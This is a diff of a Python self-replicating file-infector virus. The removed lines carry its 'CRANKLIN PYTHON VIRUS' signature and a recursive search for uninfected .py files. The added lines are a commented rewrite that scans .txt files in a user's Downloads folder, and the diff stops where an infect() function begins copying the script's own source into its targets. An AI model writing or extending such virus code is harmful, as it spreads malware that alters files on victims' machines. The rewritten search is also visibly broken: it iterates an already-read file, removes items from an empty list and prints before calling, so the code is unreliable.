@@ -1,22 +1,27 @@
 #!/usr/bin/python
 import os
 import datetime
-SIGNATURE = "CRANKLIN PYTHON VIRUS"
-def search(path):
-    filestoinfect = []
-    filelist = os.listdir(path)
-    for fname in filelist:
-        if os.path.isdir(path+"/"+fname):
-            filestoinfect.extend(search(path+"/"+fname))
-        elif fname[-3:] == ".py":
-            infected = False
-            for line in open(path+"/"+fname):
-                if SIGNATURE in line:
-                    infected = True
-                    break
-            if infected == False:
-                filestoinfect.append(path+"/"+fname)
-    return filestoinfect
+print(datetime.datetime.now())
+print("applied business technology")
+
+def search(path):       
+    filestoinfect=[] #the virus generates a list of files to be infected
+    infectedfiles=[] #the virus generates a list of files that have been infected
+    for file in os.listdir(path): #virus scans files in a folder with this "for" loop
+        if file.endswith(".txt"): #virus searches for certain file type
+            m = open(file, "r") #opens the file to read lines
+            x = m.readlines() #reads information line by line
+#print(m) #check the read file
+#print(x) #check the read lines
+            for x in m:
+                if str("applied business technology") in x: 
+                    infectedfiles.append(file)
+                    filestoinfect.remove(file)
+            m.close()
+    #print(os.path.join(path, file))
+print(filestoinfect)
+print(infectedfiles)
+search("C:\\Users\\Chase Darlington\\Downloads")
 def infect(filestoinfect):
     virus = open(os.path.abspath(__file__))
     virusstring = ""
